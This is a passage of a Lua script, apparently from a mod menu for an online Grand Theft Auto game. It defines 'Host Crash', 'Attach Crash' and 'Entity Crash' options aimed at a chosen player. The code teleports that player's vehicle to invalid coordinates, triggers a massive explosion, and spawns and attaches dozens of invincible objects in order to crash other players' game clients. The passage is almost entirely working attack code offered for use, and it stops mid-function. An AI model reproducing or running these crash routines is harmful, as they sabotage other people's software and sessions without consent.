------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	menu.click_slider(crashes, "Host Crash", {}, "Do not use when you are the host (v2 Throws the chosen person into the vehicle) ", 1, 2, 1, 1, function(s)
        local player_ped = PLAYER.PLAYER_PED_ID()
        local playername = PLAYER.GET_PLAYER_NAME(pid)
        if s == 1 then
            local old_coords = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            wait(100)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            wait(500)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            wait(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            wait(700)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, -6170.0, 10837.0, 40.0)
            wait(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player_ped, old_coords.x, old_coords.y, old_coords.z)
            toast("Ready")
        elseif s == 2 then
            tp_veh_to(pid,-6170.0, 10837.0, 40.0)
            wait(1000)
            trigger_command("becomeorbitalcannon on") 
            wait(200)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            FIRE.ADD_OWNED_EXPLOSION(PLAYER.GET_PLAYER_PED(players.user()), pos.x, pos.y, pos.z, 59, 999999.99, true, false, 8)
            wait(1000)
            trigger_command("becomeorbitalcannon off")
            toast("Ready")
        end
    end)
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	
	--ATTACH CRASH
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
	menu.click_slider(crashes, "Attach Crash (unstable)", {}, "Attaching to an invalid position.", 1, 2, 1, 1, function(s)
		local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
        if s == 1 then
            local hash1 = joaat("tr2")		    
            STREAMING.REQUEST_MODEL(hash1)
            while not STREAMING.HAS_MODEL_LOADED(hash1) do
            wait()
            end
            wait(10)
            local tr2 = entities.create_vehicle(hash1, mypos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(tr2, myped, 0, 0, 0, -10, 0, 0, 0, true, true, true, false, 0, true)
            wait(500)
            for i = 0, 50 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true) 
            wait(20)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
            wait(500)
            entities.delete(tr2)
            toast("Ready")
		elseif s == 2 then
            local hash2 = joaat("trailersmall2")		    
            STREAMING.REQUEST_MODEL(hash2)
            while not STREAMING.HAS_MODEL_LOADED(hash2) do
            wait()   
            end
            local trailer = entities.create_vehicle(hash2, mypos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(trailer, myped, 0, 0, 0, -10, 0, 0, 0, true, true, true, false, 0, true)
            wait(500)
            for i = 0, 50 do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true) 
            wait(20)
            end
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, true, true)
            wait (500)
            entities.delete(trailer)
            toast("Ready")
		end
    end)

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
	
	--INVALID OBJECT CRASH
	
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	

    menu.click_slider(crashes,"Entity Crash", {}, "V1=An object V2=Slod Pedy(Fix By By CockStar) V3=Transport V4=Bypass  ", 1, 4, 1 , 1, function(s)
        if s == 1 then
	        local myped = PLAYER.PLAYER_PED_ID()
            local mypos = ENTITY.GET_ENTITY_COORDS(myped)
		    local player_ped = PLAYER.GET_PLAYER_PED(pid)
			local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
			arg1 = math.random(0, 20)
			arg2 = math.random(-180, 180)
	        trigger_command("anticrashcamera on")
		    wait(100)
		    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
		    minitank_hash = util.joaat("minitank")
		    STREAMING.REQUEST_MODEL(minitank_hash)		
		    while not STREAMING.HAS_MODEL_LOADED(minitank_hash) do
		    	wait()
		    end
		    minitank = entities.create_object(minitank_hash, pos)
		    ENTITY.SET_ENTITY_INVINCIBLE(minitank, true)
            ENTITY.FREEZE_ENTITY_POSITION(minitank, true)
		    patrolboat_hash = util.joaat("patrolboat")
		    STREAMING.REQUEST_MODEL(patrolboat_hash)		
		    while not STREAMING.HAS_MODEL_LOADED(patrolboat_hash) do
		    	wait()
		    end
            patrolboat = entities.create_object(patrolboat_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(patrolboat, true)
            ENTITY.FREEZE_ENTITY_POSITION(patrolboat, true)
            h4_prop_bush_buddleia_low_01_hash = util.joaat("h4_prop_bush_buddleia_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_buddleia_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_buddleia_low_01_hash) do
                wait()
            end
            h4_prop_bush_buddleia_low_01 = entities.create_object(h4_prop_bush_buddleia_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_buddleia_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_buddleia_low_01, true)	   
            h4_prop_bush_ear_aa_hash = util.joaat("h4_prop_bush_ear_aa")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_aa_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_aa_hash) do
                wait()
            end
            h4_prop_bush_ear_aa = entities.create_object(h4_prop_bush_ear_aa_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_aa, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_aa, true)
            h4_prop_bush_ear_ab_hash = util.joaat("h4_prop_bush_ear_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_ab_hash) do
                wait()
            end
            h4_prop_bush_ear_ab = entities.create_object(h4_prop_bush_ear_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_ab, true)
            h4_prop_bush_fern_low_01_hash = util.joaat("h4_prop_bush_fern_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_fern_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_fern_low_01_hash) do
                wait()
            end
            h4_prop_bush_fern_low_01 = entities.create_object(h4_prop_bush_fern_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_fern_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_fern_low_01, true)
                    h4_prop_bush_mang_ad_hash = util.joaat("h4_prop_bush_mang_ad")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_ad_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_ad_hash) do
                wait()
            end
            h4_prop_bush_mang_ad = entities.create_object(h4_prop_bush_mang_ad_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_ad, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_ad, true)
            h4_prop_bush_mang_low_aa_hash = util.joaat("h4_prop_bush_mang_low_aa")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_low_aa_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_low_aa_hash) do
                wait()
            end
            h4_prop_bush_mang_low_aa = entities.create_object(h4_prop_bush_mang_low_aa_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_low_aa, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_low_aa, true)	   
            h4_prop_bush_mang_low_ab_hash = util.joaat("h4_prop_bush_mang_low_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_mang_low_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_mang_low_ab_hash) do
                wait()
            end
            h4_prop_bush_mang_low_ab = entities.create_object(h4_prop_bush_mang_low_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_mang_low_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_mang_low_ab, true)
            h4_prop_bush_seagrape_low_01_hash = util.joaat("h4_prop_bush_seagrape_low_01")
            STREAMING.REQUEST_MODEL(h4_prop_bush_seagrape_low_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_seagrape_low_01_hash) do
                wait()
            end
            h4_prop_bush_seagrape_low_01 = entities.create_object(h4_prop_bush_seagrape_low_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_seagrape_low_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_seagrape_low_01, true)	      
            h4_prop_grass_med_01_hash = util.joaat("h4_prop_grass_med_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_med_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_med_01_hash) do
                wait()
            end
            h4_prop_grass_med_01 = entities.create_object(h4_prop_grass_med_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_med_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_med_01, true)
            h4_prop_grass_tropical_lush_01_hash = util.joaat("h4_prop_grass_tropical_lush_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_tropical_lush_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_tropical_lush_01_hash) do
                wait()
            end
            h4_prop_grass_tropical_lush_01 = entities.create_object(h4_prop_grass_tropical_lush_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_tropical_lush_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_tropical_lush_01, true)	   
            h4_prop_bush_fern_tall_cc_hash = util.joaat("h4_prop_bush_fern_tall_cc")
            STREAMING.REQUEST_MODEL(h4_prop_bush_fern_tall_cc_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_fern_tall_cc_hash) do
                wait()
            end
            h4_prop_bush_fern_tall_cc = entities.create_object(h4_prop_bush_fern_tall_cc_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_fern_tall_cc, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_fern_tall_cc, true)
            h4_prop_bush_ear_ab_hash = util.joaat("h4_prop_bush_ear_ab")
            STREAMING.REQUEST_MODEL(h4_prop_bush_ear_ab_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_bush_ear_ab_hash) do
                wait()
            end
            h4_prop_bush_ear_ab = entities.create_object(h4_prop_bush_ear_ab_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_bush_ear_ab, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_bush_ear_ab, true)
            h4_prop_grass_wiregrass_01_hash = util.joaat("h4_prop_grass_wiregrass_01")
            STREAMING.REQUEST_MODEL(h4_prop_grass_wiregrass_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_grass_wiregrass_01_hash) do
                wait()
            end
            h4_prop_grass_wiregrass_01 = entities.create_object(h4_prop_grass_wiregrass_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_grass_wiregrass_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_grass_wiregrass_01, true)    		   
            h4_prop_weed_01_plant_hash = util.joaat("h4_prop_weed_01_plant")
            STREAMING.REQUEST_MODEL(h4_prop_weed_01_plant_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_01_plant_hash) do
                wait()
            end
            h4_prop_weed_01_plant = entities.create_object(h4_prop_weed_01_plant_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_01_plant, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_01_plant, true)
            h4_prop_weed_01_row_hash = util.joaat("h4_prop_weed_01_row")
            STREAMING.REQUEST_MODEL(h4_prop_weed_01_row_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_01_row_hash) do
                wait()
            end
            h4_prop_weed_01_row = entities.create_object(h4_prop_weed_01_row_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_01_row, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_01_row, true)
            h4_prop_weed_groundcover_01_hash = util.joaat("h4_prop_weed_groundcover_01")
            STREAMING.REQUEST_MODEL(h4_prop_weed_groundcover_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(h4_prop_weed_groundcover_01_hash) do
                wait()
            end
            h4_prop_weed_groundcover_01 = entities.create_object(h4_prop_weed_groundcover_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(h4_prop_weed_groundcover_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(h4_prop_weed_groundcover_01, true)
            barracks_hash = util.joaat("barracks")
            STREAMING.REQUEST_MODEL(barracks_hash)		
            while not STREAMING.HAS_MODEL_LOADED(barracks_hash) do
                wait()
            end
            barracks = entities.create_object(barracks_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks, true)	   
            barracks3_hash = util.joaat("barracks3")
            STREAMING.REQUEST_MODEL(barracks3_hash)		
            while not STREAMING.HAS_MODEL_LOADED(barracks3_hash) do
                wait()
            end
            barracks3 = entities.create_object(barracks3_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(barracks3, true)
            ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
            dune_hash = util.joaat("dune")
            STREAMING.REQUEST_MODEL(dune_hash)		
            while not STREAMING.HAS_MODEL_LOADED(dune_hash) do
                wait()
            end
            dune = entities.create_object(dune_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(dune, true)
            ENTITY.FREEZE_ENTITY_POSITION(dune, true)
            marquis_hash = util.joaat("marquis")
            STREAMING.REQUEST_MODEL(marquis_hash)		
            while not STREAMING.HAS_MODEL_LOADED(marquis_hash) do
                wait()
            end
            marquis = entities.create_object(marquis_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(marquis, true)
            ENTITY.FREEZE_ENTITY_POSITION(marquis, true)	      
            marshall_hash = util.joaat("marshall")
            STREAMING.REQUEST_MODEL(marshall_hash)		
            while not STREAMING.HAS_MODEL_LOADED(marshall_hash) do
                wait()
            end
            marshall = entities.create_object(marshall_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(marshall, true)
            ENTITY.FREEZE_ENTITY_POSITION(marshall, true)
            monster_hash = util.joaat("monster")
            STREAMING.REQUEST_MODEL(monster_hash)		
            while not STREAMING.HAS_MODEL_LOADED(monster_hash) do
                wait()
            end
            monster = entities.create_object(monster_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(monster, true)
            ENTITY.FREEZE_ENTITY_POSITION(monster, true)
            tug_hash = util.joaat("tug")
            STREAMING.REQUEST_MODEL(tug_hash)		
            while not STREAMING.HAS_MODEL_LOADED(tug_hash) do
                wait()
            end
            tug = entities.create_object(tug_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(tug, true)
            ENTITY.FREEZE_ENTITY_POSITION(tug, true)	   
            proc_brittlebush_01_hash = util.joaat("proc_brittlebush_01")
            STREAMING.REQUEST_MODEL(proc_brittlebush_01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(proc_brittlebush_01_hash) do
                wait()
            end
            proc_brittlebush_01 = entities.create_object(proc_brittlebush_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_brittlebush_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_brittlebush_01, true)
            proc_desert_sage_01_hash = util.joaat("proc_desert_sage_01")
            STREAMING.REQUEST_MODEL(proc_desert_sage_01)		
            while not STREAMING.HAS_MODEL_LOADED(proc_desert_sage_01_hash) do
                wait()
            end
            proc_desert_sage_01 = entities.create_object(proc_desert_sage_01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_desert_sage_01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_desert_sage_01, true)
            proc_drygrasses01_hash = util.joaat("proc_drygrasses01")
            STREAMING.REQUEST_MODEL(proc_drygrasses01_hash)		
            while not STREAMING.HAS_MODEL_LOADED(proc_drygrasses01_hash) do
                wait()
            end
            proc_drygrasses01 = entities.create_object(proc_drygrasses01_hash, pos)
            ENTITY.SET_ENTITY_INVINCIBLE(proc_drygrasses01, true)
            ENTITY.FREEZE_ENTITY_POSITION(proc_drygrasses01, true)   
            wait(100)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(minitank, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(patrolboat, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_buddleia_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_ear_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_ad, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_aa, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_mang_low_ab, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_seagrape_low_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_med_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_tropical_lush_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true) 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_bush_fern_tall_cc, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_grass_wiregrass_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_plant, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_01_row, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            local pos = ENTITY.GET_ENTITY_COORDS(player_ped)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, pos.x, pos.y, pos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(h4_prop_weed_groundcover_01, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)			 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)		 
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(marquis, myped, 0, arg1, arg1, arg1, arg2, arg2, arg2, false, true, false, false, 0, true)
